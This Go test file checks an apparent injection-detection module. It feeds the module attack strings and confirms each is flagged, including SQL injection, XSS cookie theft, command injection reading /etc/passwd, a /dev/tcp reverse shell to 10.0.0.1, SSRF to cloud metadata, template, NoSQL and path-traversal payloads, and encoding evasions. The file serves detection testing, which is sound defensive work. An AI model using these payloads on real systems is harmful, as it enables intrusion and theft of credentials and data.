package injection

import (
	"context"
	"sync"
	"testing"

	"github.com/1sec-project/1sec/internal/core"
	"github.com/rs/zerolog"
)

// ─── Helpers ─────────────────────────────────────────────────────────────────

type capPipeline struct {
	pipeline *core.AlertPipeline
	mu       sync.Mutex
	alerts   []*core.Alert
}

func newCapPipeline() *capPipeline {
	cp := &capPipeline{}
	cp.pipeline = core.NewAlertPipeline(zerolog.Nop(), 10000)
	cp.pipeline.AddHandler(func(a *core.Alert) {
		cp.mu.Lock()
		cp.alerts = append(cp.alerts, a)
		cp.mu.Unlock()
	})
	return cp
}

func (cp *capPipeline) count() int {
	cp.mu.Lock()
	defer cp.mu.Unlock()
	return len(cp.alerts)
}

func startedShield(t *testing.T) *Shield {
	t.Helper()
	s := New()
	cfg := core.DefaultConfig()
	if err := s.Start(context.Background(), nil, nil, cfg); err != nil {
		t.Fatalf("Shield.Start() error: %v", err)
	}
	t.Cleanup(func() { s.Stop() })
	return s
}

func startedShieldWithPipeline(t *testing.T, pipeline *core.AlertPipeline) *Shield {
	t.Helper()
	s := New()
	cfg := core.DefaultConfig()
	if err := s.Start(context.Background(), nil, pipeline, cfg); err != nil {
		t.Fatalf("Shield.Start() error: %v", err)
	}
	t.Cleanup(func() { s.Stop() })
	return s
}

func hasCategory(detections []Detection, cat string) bool {
	for _, d := range detections {
		if d.Category == cat {
			return true
		}
	}
	return false
}

// ─── Module Interface ─────────────────────────────────────────────────────────

var _ core.Module = (*Shield)(nil)

func TestShield_Name(t *testing.T) {
	s := New()
	if s.Name() != ModuleName {
		t.Errorf("Name() = %q, want %q", s.Name(), ModuleName)
	}
}

func TestShield_Description(t *testing.T) {
	s := New()
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

func TestShield_Start_Stop(t *testing.T) {
	s := New()
	cfg := core.DefaultConfig()
	if err := s.Start(context.Background(), nil, nil, cfg); err != nil {
		t.Fatalf("Start() error: %v", err)
	}
	if len(s.patterns) == 0 {
		t.Error("patterns should be compiled after Start()")
	}
	if err := s.Stop(); err != nil {
		t.Errorf("Stop() error: %v", err)
	}
}

// ─── SQL Injection ────────────────────────────────────────────────────────────

func TestAnalyzeInput_SQLi_Union(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("1 UNION SELECT username, password FROM users", "query")
	if !hasCategory(detections, "sqli") {
		t.Error("expected sqli detection for UNION SELECT")
	}
}

func TestAnalyzeInput_SQLi_OrTrue(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("' OR '1'='1'", "query")
	if !hasCategory(detections, "sqli") {
		t.Error("expected sqli detection for OR '1'='1'")
	}
}

func TestAnalyzeInput_SQLi_Stacked(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("1; DROP TABLE users", "query")
	if !hasCategory(detections, "sqli") {
		t.Error("expected sqli detection for stacked query ;DROP TABLE")
	}
}

func TestAnalyzeInput_SQLi_Sleep(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"1 AND SLEEP(5)",
		"1 AND BENCHMARK(10000000, SHA1('test'))",
		"1; WAITFOR DELAY '0:0:5'",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "query")
		if !hasCategory(detections, "sqli") {
			t.Errorf("expected sqli detection for time-based blind: %q", input)
		}
	}
}

func TestAnalyzeInput_SQLi_InformationSchema(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("SELECT * FROM information_schema.tables", "query")
	if !hasCategory(detections, "sqli") {
		t.Error("expected sqli detection for information_schema access")
	}
}

// ─── XSS ──────────────────────────────────────────────────────────────────────

func TestAnalyzeInput_XSS_ScriptTag(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("<script>alert('xss')</script>", "body")
	if !hasCategory(detections, "xss") {
		t.Error("expected xss detection for <script> tag")
	}
}

func TestAnalyzeInput_XSS_EventHandler(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		`<img onerror=alert(1)>`,
		`<body onload=alert(1)>`,
		`<div onclick=alert(1)>`,
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "body")
		if !hasCategory(detections, "xss") {
			t.Errorf("expected xss detection for event handler: %q", input)
		}
	}
}

func TestAnalyzeInput_XSS_JavascriptURI(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("javascript:alert(document.cookie)", "url")
	if !hasCategory(detections, "xss") {
		t.Error("expected xss detection for javascript: URI")
	}
}

func TestAnalyzeInput_XSS_DOMManipulation(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"document.cookie",
		"document.write('test')",
		"eval('malicious')",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "body")
		if !hasCategory(detections, "xss") {
			t.Errorf("expected xss detection for DOM manipulation: %q", input)
		}
	}
}

// ─── Command Injection ────────────────────────────────────────────────────────

func TestAnalyzeInput_CMDi_Pipe(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"| cat /etc/passwd",
		"&& whoami",
		"; ls -la",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "parameter")
		if !hasCategory(detections, "cmdi") {
			t.Errorf("expected cmdi detection for pipe/chain: %q", input)
		}
	}
}

func TestAnalyzeInput_CMDi_Subshell(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("$(whoami)", "parameter")
	if !hasCategory(detections, "cmdi") {
		t.Error("expected cmdi detection for $(whoami)")
	}
}

func TestAnalyzeInput_CMDi_ReverseShell(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "command")
	if !hasCategory(detections, "cmdi") {
		t.Error("expected cmdi detection for reverse shell")
	}
}

// ─── SSRF ─────────────────────────────────────────────────────────────────────

func TestAnalyzeInput_SSRF_InternalIP(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"http://127.0.0.1/admin",
		"http://10.0.0.1/internal",
		"http://172.16.0.1/secret",
		"http://192.168.1.1/config",
		"http://localhost/admin",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "url")
		if !hasCategory(detections, "ssrf") {
			t.Errorf("expected ssrf detection for internal IP: %q", input)
		}
	}
}

func TestAnalyzeInput_SSRF_CloudMetadata(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("http://169.254.169.254/latest/meta-data/", "url")
	if !hasCategory(detections, "ssrf") {
		t.Error("expected ssrf detection for cloud metadata endpoint")
	}
}

func TestAnalyzeInput_SSRF_FileScheme(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"file:///etc/passwd",
		"gopher://127.0.0.1:25/",
		"dict://localhost:11211/",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "url")
		if !hasCategory(detections, "ssrf") {
			t.Errorf("expected ssrf detection for scheme: %q", input)
		}
	}
}

// ─── LDAP Injection ───────────────────────────────────────────────────────────

func TestAnalyzeInput_LDAP_Injection(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"*)(& (uid=admin)",
		"(|(uid=*)(cn=admin))",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "ldap_filter")
		if !hasCategory(detections, "ldapi") {
			t.Errorf("expected ldapi detection for: %q", input)
		}
	}
}

// ─── Template Injection ───────────────────────────────────────────────────────

func TestAnalyzeInput_Template_Jinja(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("{{''.__class__.__mro__[1].__subclasses__()}}", "template")
	if !hasCategory(detections, "template") {
		t.Error("expected template injection detection for Jinja2 payload")
	}
}

// ─── NoSQL Injection ──────────────────────────────────────────────────────────

func TestAnalyzeInput_NoSQL_Operator(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		`{"$gt": ""}`,
		`{"$ne": null}`,
		`{"$where": "this.password == 'test'"}`,
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "json_body")
		if !hasCategory(detections, "nosql") {
			t.Errorf("expected nosql detection for: %q", input)
		}
	}
}

// ─── Path Traversal ───────────────────────────────────────────────────────────

func TestAnalyzeInput_PathTraversal(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("../../etc/passwd", "filename")
	if !hasCategory(detections, "path") {
		t.Error("expected path traversal detection for ../../etc/passwd")
	}
}

func TestAnalyzeInput_PathTraversal_SensitiveFiles(t *testing.T) {
	s := startedShield(t)
	cases := []string{
		"/etc/passwd",
		"/etc/shadow",
		".env",
		".git/config",
	}
	for _, input := range cases {
		detections := s.AnalyzeInput(input, "filename")
		if !hasCategory(detections, "path") {
			t.Errorf("expected path detection for sensitive file: %q", input)
		}
	}
}

func TestAnalyzeInput_NullByte(t *testing.T) {
	s := startedShield(t)
	detections := s.AnalyzeInput("file.php%00.jpg", "filename")
	if !hasCategory(detections, "path") {
		t.Error("expected path detection for null byte injection")
	}
}

// ─── Clean Input (No False Positives) ─────────────────────────────────────────

func TestAnalyzeInput_CleanInput(t *testing.T) {
	s := startedShield(t)
	cleanInputs := []string{
		"Hello, how are you today?",
		"The quick brown fox jumps over the lazy dog",
		"user@example.com",
		"John Smith",
		"Order #12345 has been shipped",
		"Please review the attached document",
	}
	for _, input := range cleanInputs {
		detections := s.AnalyzeInput(input, "body")
		if len(detections) > 0 {
			t.Errorf("expected no detections for clean input %q, got %d", input, len(detections))
		}
	}
}

// ─── URL Encoded Payloads ─────────────────────────────────────────────────────

func TestAnalyzeInput_URLEncoded(t *testing.T) {
	s := startedShield(t)
	// URL-encoded <script>alert(1)</script>
	encoded := "%3Cscript%3Ealert(1)%3C/script%3E"
	detections := s.AnalyzeInput(encoded, "query")
	if !hasCategory(detections, "xss") {
		t.Error("expected xss detection for URL-encoded <script> tag")
	}
}

// ─── normalizeInput ───────────────────────────────────────────────────────────

func TestNormalizeInput(t *testing.T) {
	cases := []struct {
		name  string
		input string
		want  string
	}{
		// Basic URL decoding (existing tests)
		{"url_script_tag", "%3Cscript%3E", "<script>"},
		{"url_sqli", "%27 OR %271%27=%271", "' OR '1'='1"},
		{"passthrough", "hello world", "hello world"},

		// Double URL encoding
		{"double_encode", "%253Cscript%253E", "<script>"},

		// HTML entity decoding — named
		{"html_named_lt_gt", "&lt;script&gt;", "<script>"},
		{"html_named_amp", "1 &amp; 2", "1 & 2"},
		{"html_named_quot", "&quot;hello&quot;", "\"hello\""},

		// HTML entity decoding — numeric decimal
		{"html_decimal", "&#60;script&#62;", "<script>"},

		// HTML entity decoding — numeric hex
		{"html_hex", "&#x3C;script&#x3E;", "<script>"},

		// Backslash hex escapes
		{"backslash_hex", "\\x3Cscript\\x3E", "<script>"},

		// Backslash unicode escapes
		{"backslash_unicode", "\\u003Cscript\\u003E", "<script>"},

		// SQL comment stripping
		{"sql_comment_evasion", "SEL/**/ECT", "SELECT"},
		{"sql_comment_union", "UN/*bypass*/ION SEL/**/ECT", "UNION SELECT"},

		// Whitespace normalization
		{"tab_evasion", "SELECT\t*\tFROM", "SELECT * FROM"},
		{"newline_evasion", "SELECT\n*\nFROM", "SELECT * FROM"},
		{"multi_space_collapse", "SELECT   *   FROM", "SELECT * FROM"},

		// Fullwidth character normalization
		{"fullwidth_parens", "\uFF08\uFF09", "()"},
		{"fullwidth_angle", "\uFF1Cscript\uFF1E", "<script>"},
		{"fullwidth_slash", "\uFF0Fetc\uFF0Fpasswd", "/etc/passwd"},

		// Cyrillic homoglyph normalization
		{"cyrillic_select", "S\u0415L\u0415\u0421T", "SELECT"},

		// Null byte stripping
		{"null_byte", "admin\x00' OR '1'='1", "admin' OR '1'='1"},

		// Combined evasion — real-world attack pattern
		{"combined_evasion", "%253C%2573cript%253E", "<script>"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := normalizeInput(tc.input)
			if got != tc.want {
				t.Errorf("normalizeInput(%q) = %q, want %q", tc.input, got, tc.want)
			}
		})
	}
}


// ─── extractScanFields ────────────────────────────────────────────────────────

func TestExtractScanFields(t *testing.T) {
	ev := core.NewSecurityEvent("test", "http_request", core.SeverityInfo, "test request")
	ev.Details["url"] = "http://example.com/api"
	ev.Details["body"] = `{"user": "admin"}`
	ev.Details["query"] = "id=1"
	ev.Details["empty_field"] = ""

	fields := extractScanFields(ev)
	if fields["url"] != "http://example.com/api" {
		t.Errorf("url field = %q, want 'http://example.com/api'", fields["url"])
	}
	if fields["body"] != `{"user": "admin"}` {
		t.Error("body field not extracted correctly")
	}
	if fields["query"] != "id=1" {
		t.Error("query field not extracted correctly")
	}
	// Empty fields should not be included
	if _, ok := fields["empty_field"]; ok {
		t.Error("empty fields should not be included")
	}
	// Summary should be included
	if fields["summary"] != "test request" {
		t.Error("summary should be included in scan fields")
	}
}

// ─── categoryLabel ────────────────────────────────────────────────────────────

func TestCategoryLabel(t *testing.T) {
	cases := []struct {
		cat  string
		want string
	}{
		{"sqli", "SQL Injection"},
		{"xss", "Cross-Site Scripting"},
		{"cmdi", "Command Injection"},
		{"ssrf", "Server-Side Request Forgery"},
		{"ldapi", "LDAP Injection"},
		{"template", "Template Injection"},
		{"nosql", "NoSQL Injection"},
		{"path", "Path Traversal"},
		{"unknown", "unknown"},
	}
	for _, tc := range cases {
		got := categoryLabel(tc.cat)
		if got != tc.want {
			t.Errorf("categoryLabel(%q) = %q, want %q", tc.cat, got, tc.want)
		}
	}
}

// ─── HandleEvent Integration ──────────────────────────────────────────────────

func TestShield_HandleEvent(t *testing.T) {
	cp := newCapPipeline()
	s := startedShieldWithPipeline(t, cp.pipeline)

	ev := core.NewSecurityEvent("test", "http_request", core.SeverityInfo, "request")
	ev.Details["query"] = "1 UNION SELECT username, password FROM users"
	ev.SourceIP = "10.0.0.1"
	ev.UserAgent = "Mozilla/5.0"

	if err := s.HandleEvent(ev); err != nil {
		t.Fatalf("HandleEvent() error: %v", err)
	}

	if cp.count() == 0 {
		t.Error("expected alert for SQL injection in http_request")
	}
}
